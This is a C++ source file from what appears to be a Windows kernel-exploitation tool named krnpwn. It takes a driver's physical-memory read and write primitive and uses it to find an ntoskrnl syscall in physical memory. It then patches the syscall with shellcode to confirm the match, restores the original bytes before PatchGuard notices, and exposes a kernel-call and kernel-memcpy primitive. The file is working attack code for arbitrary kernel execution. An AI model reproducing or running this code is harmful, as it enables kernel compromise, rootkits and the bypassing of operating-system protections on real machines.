#include "krnpwn.hpp"
#include "../util/native.hpp"
#include "../util/log.hpp"

#define PAGE_4KB 0x1000
#define PAGE_4MB 0x400000

namespace krnpwn
{
    krnpwn::krnpwn()
    {}
        
    krnpwn::~krnpwn()
    {}

    bool krnpwn::initalise( std::shared_ptr<krnpwn_base> _driver )
    {
        drv = _driver;

        // get the valid physical memory regions from registry 
        regions = native::parse_resource_map(
            "Hardware\\ResourceMap\\System Resources\\Physical Memory", ".Translated" );

        // load ntoskrnl into address space, DONT_RESOLVE_DLL_REFERENCES disables automatic code execution
        ntoskrnl_local = ( uint8_t* )LoadLibraryExA( "ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES );

        // get offset for syscall we want to hook
        // clear warning for pointer truncation
        // https://stackoverflow.com/questions/1640423/error-cast-from-void-to-int-loses-precision
        void* tmp = native::find_export( ( void* )ntoskrnl_local, SYSCALL_FUNC, true );
        ksyscall_rva = *( uint32_t* )&tmp;

        log_info( SYSCALL_FUNC, "offset:", std::hex, ksyscall_rva );

        //  rva mod 4kb (0x1000) to get page offset of the function
        page_offset = ksyscall_rva % PAGE_4KB;

        log_info( SYSCALL_FUNC, "page offset:", std::hex, page_offset, "\n" );

        // loop through the physical memory regions we found from the registry
        for( auto region : regions )
        {
            log_info( "searching region", std::hex, region.address, "->", std::hex, ( region.address + region.size ) );

            ksyscall_address = find_ksyscall( region.address, region.size );

            if( ksyscall_address != 0 )
                break;
        }

        if( ksyscall_address != 0 )
        {
            log_info( "found", SYSCALL_FUNC, "in physical memory:", std::hex, ksyscall_address, "\n" );
            initalised = true;
        }
        else
        {
            log_err( "could not find syscall" );
        }

        return initalised;
    }

    uint64_t krnpwn::find_ksyscall( uint64_t address, uint64_t size )
    {
        uint64_t phys_dump_size = ( size < PAGE_4MB ) ? size : PAGE_4MB;

        // allocate buffer size of memory
        const uint8_t* phys_dump_data = ( uint8_t* )VirtualAlloc( 
            nullptr, phys_dump_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

        for( auto offset = 0ull; offset < size; offset += phys_dump_size )
        {
            // read physical memory to populate our buffer with the memory at the physical address
            if( !drv->read_physical_memory( ( uint64_t )( address + offset ), ( void* )phys_dump_data, phys_dump_size ) )
                continue;

            // loop through the region a page at a time
            for( auto page = 0ull; page < phys_dump_size; page += PAGE_4KB )
            {
                // using the page_offset found we compare the first 32 bytes of memory 
                if( memcmp( phys_dump_data + page + page_offset, ntoskrnl_local + ksyscall_rva, 32 ) == 0 )
                {
                    log_dbg( "potential match:", std::hex, ( address + offset + page + page_offset ) );

                    // if they match we need to validate that it is the correct function
                    if( valid_ksyscall( address + offset + page + page_offset ) )
                    {
                        // return the absolute physical address of the function
                        return ( uint64_t )( address + offset + page + page_offset );
                    }
                }
            }

            // if the size of the region - current offset is smaller than 4MB use the difference
            phys_dump_size = ( size - offset ) < phys_dump_size ? ( size - offset ) : phys_dump_size;
        }

        if( phys_dump_data )
            VirtualFree( ( void* )phys_dump_data, NULL, MEM_RELEASE );

        return 0;
    }

    bool krnpwn::valid_ksyscall( uint64_t address )
    {
        // get the address of the usermode syscall
        static const auto proc = native::find_export( LoadLibraryA( syscall_mod ), SYSCALL_FUNC );

        // shellcode will simply output 0
        // this works because all syscalls return NTSTATUS as the result and most 
        // will return C000000D ( STATUS_INVALID_PARAMETER )
        std::uint8_t shellcode[] = 
        { 
            0x48, 0x31, 0xC0,           // xor rax, rax
            0xC3                        // ret
        };

        // create buffer for original bytes of the function
        std::uint8_t orig_bytes[ sizeof shellcode ];

        // save original bytes and write shellcode
        drv->read_physical_memory( address, orig_bytes, sizeof( orig_bytes ) );
        drv->write_physical_memory( address, shellcode, sizeof( shellcode ) );

        // call the syscall to see if we get 0 returned, this ensures we have found the 
        // correct function in physical memory
        NTSTATUS result = reinterpret_cast< NTSTATUS( __fastcall* )( void ) >( proc )();

        log_dbg( "result of func call:", result, "\n" );

        // write the original code back asap before patch guard gets triggered
        drv->write_physical_memory( address, orig_bytes, sizeof( orig_bytes ) );

        // if result is 0 then this is the correct function in ntoskrnl
        return result == 0;
    }

    bool krnpwn::kmemcpy( void* dst, void* src, size_t size )
    {
        static const auto func = native::find_kernel_export( "ntoskrnl.exe", "memcpy" );

        return kcall< decltype( &memcpy ) >( func, dst, src, size );
    }
}